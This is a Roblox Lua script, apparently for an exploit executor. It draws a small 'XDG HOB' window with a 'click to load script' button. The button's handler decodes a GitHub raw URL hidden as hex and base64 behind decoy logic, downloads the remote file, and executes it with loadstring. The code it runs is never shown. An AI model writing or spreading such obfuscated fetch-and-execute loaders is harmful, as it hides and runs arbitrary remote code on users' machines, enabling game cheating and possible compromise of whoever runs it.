local GUI = Instance.new("ScreenGui")
GUI.Name = "XDGHOBGUI"
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Parent = GUI

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 8)
FrameCorner.Parent = Frame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.fromRGB(60, 60, 65)
FrameStroke.Thickness = 2
FrameStroke.Parent = Frame

local TitleFrame = Instance.new("Frame")
TitleFrame.Name = "TitleBar"
TitleFrame.Size = UDim2.new(1, 0, 0, 30)
TitleFrame.Position = UDim2.new(0, 0, 0, 0)
TitleFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
TitleFrame.BorderSizePixel = 0
TitleFrame.Parent = Frame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TitleFrame

local Title = Instance.new("TextLabel")
Title.Name = "TitleLabel"
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "XDG HOB"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleFrame

local CloseBtn = Instance.new("TextButton")
CloseBtn.Name = "CloseButton"
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -30, 0, 0)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "×"
CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
CloseBtn.TextSize = 24
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = TitleFrame

CloseBtn.MouseEnter:Connect(function()
    CloseBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
end)

CloseBtn.MouseLeave:Connect(function()
    CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
end)

CloseBtn.MouseButton1Click:Connect(function()
    GUI:Destroy()
end)

local BTN = Instance.new("TextButton")
BTN.Name = "ScriptButton"
BTN.Size = UDim2.new(0, 300, 0, 60)
BTN.Position = UDim2.new(0.5, 0, 0.5, 0)
BTN.AnchorPoint = Vector2.new(0.5, 0.5)
BTN.BackgroundColor3 = Color3.fromRGB(60, 180, 90)
BTN.Text = "点击后加载脚本"
BTN.TextColor3 = Color3.fromRGB(255, 255, 255)
BTN.TextSize = 20
BTN.Font = Enum.Font.GothamBold
BTN.Parent = Frame

local BTNCR = Instance.new("UICorner")
BTNCR.CornerRadius = UDim.new(0, 6)
BTNCR.Parent = BTN

local BTNStroke = Instance.new("UIStroke")
BTNStroke.Color = Color3.fromRGB(40, 140, 70)
BTNStroke.Thickness = 2
BTNStroke.Parent = BTN

BTN.MouseEnter:Connect(function()
    BTN.BackgroundColor3 = Color3.fromRGB(70, 200, 100)
end)

BTN.MouseLeave:Connect(function()
    BTN.BackgroundColor3 = Color3.fromRGB(60, 180, 90)
end)

BTN.MouseButton1Click:Connect(function()
    GUI.Enabled = false
    local function decode(hex)
        local res = ""
        for i = 1, #hex, 2 do
            res = res .. string.char(tonumber(hex:sub(i, i + 1), 16))
        end
        return res
    end
local t = {["a"]="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e6968616f6e6968616f6e6968616f6e2d736f757263652f5844472d484f422f6d61696e2f6b65792e6c7561"}
local function j(s) local r="" for i=1,#s,2 do r=r..string.char(tonumber(s:sub(i,i+1),16)) end return r end
local function l(s) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' s=string.gsub(s,'[^'..b..'=]','') return (s:gsub('.',function(x) if x=='='then return'' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%(2^i)-f%(2^(i-1))>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if #x~=8 then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c) end)) end
local v = math.random(999,9999999)
local w = j(t["a"])
local x = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25paGFvbmlhaW9uLXNvdXJjZS9YREctSE9CL21haW4va2V5Lmx1YQ=="
local z = setmetatable({get=function() return w end}, {}) 
local k = ({game = game})["game"]
local url = (w==j(t["a"])) and l(x) or z.get()
local s = k:HttpGet(url)
assert(type(s)=="string" and #s>0,"Remote script load failed! URL: "..url)
loadstring(s)()